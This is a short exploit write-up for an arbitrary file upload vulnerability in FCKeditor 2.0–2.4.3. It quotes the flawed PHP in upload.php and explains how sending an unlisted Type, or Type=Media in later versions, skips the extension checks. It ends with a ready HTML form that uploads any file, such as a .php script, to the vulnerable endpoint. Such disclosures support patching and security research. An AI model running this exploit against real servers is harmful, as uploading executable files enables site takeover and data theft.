FCKeditor 2.x <= 2.4.3 Arbitrary File Upload Vulnerability
==========================================================

# Exploit Title: FCKeditor 2.0-2.4.3 arbitrary file upload
# Author: grabz
# Software Link: http://sourceforge.net/projects/fckeditor/
# Version: FCKeditor 2.x <= 2.4.3
# Tested on: 2.0, 2.2, 2.3.2, 2.4.0, 2.4.3
 
for version 2.0 - 2.2:
in file FCKeditor/editor/filemanager/upload/php/upload.php
#$sType = isset( $_GET[&#039;Type&#039;] ) ? $_GET[&#039;Type&#039;] : &#039;File&#039; ;
#
#// Get the allowed and denied extensions arrays.
#$arAllowed    = $Config[&#039;AllowedExtensions&#039;][$sType] ;
#$arDenied    = $Config[&#039;DeniedExtensions&#039;][$sType] ;
we can send as Type any text that not contained in (File, Flash, Image) and
then we can upload file with any extension like ".php"
 
for version 2.3.0 - 2.4.3:
in file FCKeditor/editor/filemanager/upload/php/upload.php
#$sType = isset( $_GET[&#039;Type&#039;] ) ? $_GET[&#039;Type&#039;] : &#039;File&#039; ;
#
#// Check if it is an allowed type.
#if ( !in_array( $sType, array(&#039;File&#039;,&#039;Image&#039;,&#039;Flash&#039;,&#039;Media&#039;) ) )
#    SendResults( 1, &#039;&#039;, &#039;&#039;, &#039;Invalid type specified&#039; ) ;
#
#// Get the allowed and denied extensions arrays.
#$arAllowed    = $Config[&#039;AllowedExtensions&#039;][$sType] ;
#$arDenied    = $Config[&#039;DeniedExtensions&#039;][$sType] ;
in this code we can see filter by Type, but in config.php
$Config[&#039;AllowedExtensions&#039;][&#039;Media&#039;] and
$Config[&#039;DeniedExtensions&#039;][&#039;Media&#039;] not exists))
if we send Type=Media, we can upload any file)
 
#Exploit
<form enctype="multipart/form-data" action="
http://localhost/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media"
method="post">
<input name="NewFile" type="file">
<input type="submit" value="submit">
</form>



